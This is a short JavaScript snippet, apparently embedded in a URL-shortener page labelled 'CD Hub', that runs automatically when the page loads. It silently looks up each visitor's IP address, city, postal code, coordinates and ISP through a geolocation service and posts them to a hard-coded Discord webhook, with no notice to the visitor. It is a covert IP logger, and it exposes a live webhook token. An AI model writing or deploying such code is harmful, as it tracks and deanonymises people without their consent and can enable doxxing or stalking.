async function sendAllUserDataToWebhook() {
  const response = await fetch('https://ipapi.co/json/');
  const data = await response.json();

  const embed = {
    title: "New User Info",
    description: "User data collected from the website visit.", 
    color: 0x32CD32,
    fields: [
      { name: "IP Address", value: data.ip || 'N/A', inline: true },
      { name: "City", value: data.city || 'N/A', inline: true },
      { name: "Region", value: data.region || 'N/A', inline: true },
      { name: "Region Code", value: data.region_code || 'N/A', inline: true },
      { name: "Country", value: data.country_name || 'N/A', inline: true },
      { name: "Country Code", value: data.country_code || 'N/A', inline: true },
      { name: "Postal Code", value: data.postal || 'N/A', inline: true },
      { name: "Latitude", value: data.latitude || 'N/A', inline: true },
      { name: "Longitude", value: data.longitude || 'N/A', inline: true },
      { name: "Provider/Organization", value: data.org || 'N/A', inline: true },
      { name: "Timezone", value: data.timezone || 'N/A', inline: true },
      { name: "ASN", value: data.asn || 'N/A', inline: true },
      { name: "IP Version", value: data.ip_type || 'N/A', inline: true },
      { name: "Continent Code", value: data.continent_code || 'N/A', inline: true },
      { name: "Continent", value: data.continent_name || 'N/A', inline: true },
      { name: "Languages", value: data.languages || 'N/A', inline: true },
      { name: "Currency", value: data.currency || 'N/A', inline: true },
      { name: "Internet Service Provider", value: data.isp || 'N/A', inline: true }
    ],
    footer: {
      text: "CD Hub - URL Shortener" 
    }
  };
  const webhookURL = 'https://discord.com/api/webhooks/1325964921938116619/-Xyo8xmmD2CCY6V3s8RyzmNe1INHKWNOz0S-o7-3jek-xD8aJ1433Qg518t90gzePUjo';

  await fetch(webhookURL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({ embeds: [embed] }), 
  });
}

window.onload = async () => {
  await sendAllUserDataToWebhook();
};
